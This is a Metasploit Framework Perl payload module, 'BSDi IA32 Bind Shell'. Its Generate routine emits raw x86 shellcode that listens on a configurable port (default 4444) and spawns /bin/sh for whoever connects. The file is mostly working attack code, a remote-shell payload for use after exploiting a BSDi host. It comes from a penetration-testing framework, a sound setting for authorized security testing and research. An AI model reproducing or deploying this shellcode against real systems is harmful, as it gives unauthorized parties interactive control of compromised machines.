
##
# This file is part of the Metasploit Framework and may be redistributed
# according to the licenses defined in the Authors field below. In the
# case of an unknown or missing license, this file defaults to the same
# license as the core Framework (dual GPLv2 and Artistic). The latest
# version of the Framework can always be obtained from metasploit.com.
##

package Msf::Payload::bsdi_ia32_bind;

use strict;
use base 'Msf::PayloadComponent::BindConnection';

my $info =
{
	'Name'         => 'BSDi IA32 Bind Shell',
	'Version'      => '$Revision$',
	'Description'  => 'Listen for connection and spawn a shell',
	'Authors'      => [ 'skape <mmiller [at] hick.org>', 
	                    'optyx <optyx [at] uberhax0r.net>' ],
	'Arch'         => [ 'x86' ],
	'Priv'         => 0,
	'OS'           => [ 'bsdi' ],
	'Size'         => '',
};

sub new 
{
	my $class = shift;
	my $hash = @_ ? shift : { };

	$hash = $class->MergeHashRec($hash, {'Info' => $info});

	my $self = $class->SUPER::new($hash, @_);
	
	$self->_Info->{'Size'} = $self->_GenSize;

	return $self;
}

sub Build 
{
	my $self = shift;

	return $self->Generate($self->GetVar('LPORT'));
}

sub Generate 
{
	my $self = shift;
	my $port = shift;
	my $port_bin = pack('n', $port);
	my $off_port = 0x1f;
 
	my $shellcode = 
		"\x89\xe5\x68\x00\x07\x00\xc3\xb8\x9a\x00\x00\x00\x99\x50\x89\xe6" .
		"\x31\xc0\x50\x40\x50\x40\x50\xb0\x61\xff\xd6\x52\x68\x10\x02\xbf" .
		"\xbf\x89\xe3\x6a\x10\x53\x50\x6a\x68\x58\xff\xd6\xb0\x6a\xff\xd6" .
		"\x59\x52\x52\x51\xb0\x1e\xff\xd6\x97\x6a\x02\x59\x6a\x5a\x58\x51" .
		"\x57\xff\xd6\x49\x79\xf6\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69" .
		"\x6e\x89\xe3\x50\x54\x53\xb0\x3b\xff\xd6";

	substr($shellcode, $off_port, 2, $port_bin);
  
	return $shellcode;
}

sub _GenSize 
{
	my $self = shift;
	
	return length($self->Generate(4444));
}

1;
